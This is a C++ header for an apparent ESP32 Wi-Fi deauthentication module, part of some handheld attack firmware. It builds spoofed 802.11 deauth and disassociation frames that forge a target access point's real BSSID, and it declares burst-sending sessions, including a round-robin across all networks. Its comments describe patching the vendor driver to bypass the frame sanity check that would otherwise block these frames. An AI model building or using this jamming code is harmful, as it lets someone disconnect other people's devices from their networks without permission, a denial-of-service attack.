#pragma once
// Wi-Fi de-auth module (internal engineering notes phase 7). Compile-gated: WIFI_DEAUTH_ENABLE.
//
// Frame building is pure (host-testable, no Arduino). Device-side TX uses
// the PUBLIC raw-TX API esp_wifi_80211_tx() — in esp_wifi.h, symbol in
// libnet80211.a, present on both IDF 4.4 and 5.3.2 prebuilts, unassociated
// use OK, len >= 24. (The ESP8266-era names esp_wifi_tx / WIFI_MODE_MONITOR
// do not exist in ESP-IDF at all — don't grep for them.) Per-frame TX
// results are counted and shown; whether the prebuilt actually allows raw
// mgmt TX from an unassociated STA is a known unknown device validation answers.
#include <cstdint>
#include <cstddef>
#include <cstdio>   // sscanf (parse_mac)

namespace deauth {

// 802.11 Management/Deauthentication frame (AP -> station), 26 bytes:
//   fc wire [0xC0, 0x00] = fc 0x00C0 (ver 0, mgmt, subtype 12 = DEAUTH) |
//   duration=0 | addr1=dst (target station or broadcast) |
//   addr2=BSSID (the target AP's real BSSID — the sender) |
//   addr3=BSSID (the target AP's real BSSID) | seq=0 | reason=6.
// FC verified against the IEEE 802.11 mgmt subtype table and aircrack-ng's
// DEAUTH_REQ ("\xC0\x00..."): deauth = subtype 12 (1100b), version 0.
// (0.4.4 shipped fc 0x0002 = Association Request, version 2 — it transmitted
//  but was not a deauth frame; corrected here.)
// Driver allowlist (unpatched prebuilt, device-verified): deauth(12) is
// REJECTED — "wifi:unsupport frame type: 0c0", 0x102 (ESP_ERR_NOT_SUPPORTED).
// The patched prebuilt (the guarded local patch, bypass of
// ieee80211_raw_frame_sanity_check) accepts it.
// Returns frame length (26).
inline int build_deauth_frame(uint8_t *o, const uint8_t dst[6],
                              const uint8_t bssid[6]) {
    o[0] = 0xC0; o[1] = 0x00;                 // fc 0x00C0: ver0 mgmt, subtype 12 = DEAUTH
    o[2] = 0x00; o[3] = 0x00;                 // duration
    for (int i = 0; i < 6; ++i) o[4 + i] = dst[i];
    for (int i = 0; i < 6; ++i) o[10 + i] = bssid[i];
    for (int i = 0; i < 6; ++i) o[16 + i] = bssid[i];
    o[22] = 0x00; o[23] = 0x00;               // sequence control
    o[24] = 0x06; o[25] = 0x00;               // reason code 6: class 3 frame
    return 26;
}

// 802.11 Management/Disassociation frame (AP -> station), 24 bytes:
//   fc wire [0xA0, 0x00] = fc 0x00A0 (ver 0, mgmt, subtype 10 = DISASSOC) |
//   duration=0 | addr1=dst | addr2=BSSID | addr3=BSSID | reason=1.
// Same purpose as deauth (drops the client from the network); some clients
// respond to one and not the other, so bursts alternate both.
// Note: the UNPATCHED driver allowlist rejects 0xA0 (allowlist = 0x40/0x50,
// 0x80, 0xD0 only) — like deauth it needs the the guarded local patch patch.
// Returns frame length (24).
inline int build_disassoc_frame(uint8_t *o, const uint8_t dst[6],
                                const uint8_t bssid[6]) {
    o[0] = 0xA0; o[1] = 0x00;                 // fc 0x00A0: ver0 mgmt, subtype 10 = DISASSOC
    o[2] = 0x00; o[3] = 0x00;                 // duration
    for (int i = 0; i < 6; ++i) o[4 + i] = dst[i];
    for (int i = 0; i < 6; ++i) o[10 + i] = bssid[i];
    for (int i = 0; i < 6; ++i) o[16 + i] = bssid[i];
    o[22] = 0x01; o[23] = 0x00;               // reason code 1: unspecified
    return 24;
}

// Set TX power for the next session (0.25 dBm units, clamped to [8, 84]).
void set_tx_power(int8_t p);

// "AA:BB:CC:DD:EE:FF" -> 6 bytes. False on garbage.
inline bool parse_mac(const char *s, uint8_t out[6]) {
    for (int i = 0; i < 6; ++i) {
        unsigned v;
        char sep[2] = {0, 0};
        // pair i starts at 3*i (two hex + one colon); %2x stops at the
        // non-hex char, %1s reads that one char (must be ':').
        int n = sscanf(s + 3 * i, "%2x%1s", &v, sep);
        if (n == 0) return false;
        out[i] = (uint8_t)v;
        if (i < 5 && (n != 2 || sep[0] != ':')) return false;
    }
    return s[17] == '\0';   // exactly 17 chars — no trailing garbage
}

struct Target { char bssid[18]; char ssid[18]; int chan; };

// Device-side session (ESP32 build only):
//   begin_session  driver up on the target channel, nRF24 powered down
//   retarget       switch a running session to another target/channel
//                  without tearing the driver down (ALL-networks round-robin)
//   tx_burst       kFrames frames at kGapMs spacing; returns frames sent
//   stop_session   Wi-Fi OFF (the safe state) + serial audit line
bool begin_session(const Target &t);
bool retarget(const Target &t);
int  tx_burst();
void stop_session(const char *reason);
uint32_t frames_sent();
uint32_t frames_err();
uint32_t last_error();   // last ESP_ERR_* from esp_wifi_80211_tx (diagnostic)
}
